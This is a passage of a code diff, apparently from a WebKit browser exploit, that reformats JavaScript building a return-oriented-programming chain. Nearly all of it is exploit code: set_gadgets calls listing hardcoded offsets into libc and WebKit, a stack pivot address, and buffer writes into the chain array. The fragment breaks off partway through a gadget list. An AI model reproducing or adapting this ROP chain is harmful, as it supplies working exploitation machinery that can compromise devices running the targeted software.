@@ -17,48 +17,11 @@ function db(data)
 for(var i = 0; i < data.length; i++)
 ropchain_array[ropchain_offset++] = data[i];
 }
-var main_ret = malloc(8);
-var printf_buf = malloc(65536);
-var __swbuf_addr = 0;
-set_gadgets([
-libc_base+788575,
-ropchain+65720,
-webkit_base+14461559,
-libc_base+206806,
-ropchain+65680,
-libc_base+793877
-]);
-db([8, 0]);
-set_gadgets([
-libc_base+248252,
-libc_base+788575,
-ropchain+112,
-libc_base+471355,
-libc_base+811575,
-ropchain+413032,
-libc_base+811575,
-ropchain+65680
-]);
-var printf_buf_offset = 128;
-set_gadget(printf_buf);
-db([4294967295, 4294967295]);
-ropchain_offset += 16384;
-set_gadgets([
-libc_base+882884,
-libc_base+793877,
-main_ret,
-webkit_base+7438103,
-libc_base+206806
-]);
-db([0, 0]);
-set_gadgets([
-pivot_addr,
-libc_base+793877
-]);
-db([8, 0]);
-set_gadgets([
-libc_base+248252,
-libc_base+793877,
+var main_ret = malloc(8);var printf_buf = malloc(65536);var __swbuf_addr = 0;set_gadgets([libc_base+788575,ropchain+65720,webkit_base+14461559,libc_base+206806,ropchain+65680,libc_base+793877]);db([8, 0]);
+set_gadgets([libc_base+248252,libc_base+788575,ropchain+112,libc_base+471355,libc_base+811575,ropchain+413032,libc_base+811575,ropchain+65680]);
+var printf_buf_offset = 128;set_gadget(printf_buf);db([4294967295, 4294967295]);
+ropchain_offset += 16384;set_gadgets([libc_base+882884,libc_base+793877,main_ret,webkit_base+7438103,libc_base+206806]);
+db([0, 0]);set_gadgets([pivot_addr,libc_base+793877]);db([8, 0]);set_gadgets([libc_base+248252,libc_base+793877,
 ropchain+65800,
 webkit_base+7438103,
 libc_base+759626,
